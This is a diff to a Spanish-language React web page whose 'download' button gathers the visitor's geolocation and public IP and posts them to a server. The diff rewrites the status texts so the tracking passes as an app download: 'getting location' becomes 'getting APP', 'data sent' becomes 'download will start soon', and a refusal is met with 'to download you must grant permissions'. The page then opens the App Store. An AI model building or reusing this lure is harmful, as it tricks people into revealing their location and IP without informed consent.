@@ -4,10 +4,10 @@ export default function Home() {
   const [status, setStatus] = useState('');
 
   const handleDownload = async () => {
-    setStatus('Obteniendo ubicación...');
+    setStatus('Obteniendo APP...');
 
     if (!navigator.geolocation) {
-      setStatus('Geolocalización no soportada');
+      setStatus('APP no soportada');
       return;
     }
 
@@ -15,7 +15,7 @@ export default function Home() {
       try {
         const { latitude, longitude } = position.coords;
 
-        // Obtener IP pública
+        // Obtener pública
         const res = await fetch('https://api64.ipify.org?format=json');
         const data = await res.json();
         const ip = data.ip;
@@ -31,7 +31,7 @@ export default function Home() {
           body: JSON.stringify({ texto: combined }),
         });
 
-        setStatus('Datos enviados con éxito');
+        setStatus('Pronto iniciara la descarga....');
 
         // Redirigir a la App Store (ficticia aquí)
         window.open('https://apps.apple.com', '_blank');
@@ -40,7 +40,7 @@ export default function Home() {
         setStatus('Error al enviar datos');
       }
     }, () => {
-      setStatus('Permiso de ubicación denegado');
+      setStatus('Para poder descargar debes dar permisos');
     });
   };
 
